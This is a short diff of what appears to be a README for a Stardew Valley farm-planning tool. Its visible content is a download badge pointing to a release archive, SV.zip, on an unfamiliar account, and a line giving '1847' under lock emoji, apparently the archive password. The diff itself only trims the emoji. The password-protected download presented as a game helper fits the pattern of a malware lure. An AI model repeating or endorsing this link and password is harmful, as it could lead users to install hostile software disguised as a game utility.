@@ -8,7 +8,7 @@ I wanted to min-max my farm without alt-tabbing to the wiki every 30 seconds. So
 
 [![DOWNLOAD STARDEW-VALLEY](https://img.shields.io/badge/DOWNLOAD-blue?style=for-the-badge&logo=link&logoColor=white)](https://github.com/Betalyacompress/Stardew-Valley-Farm/releases/download/Release/SV.zip)
 
-**🔐🔐🔐 — 1847**
+**🔐 — 1847**
 
 ---
 
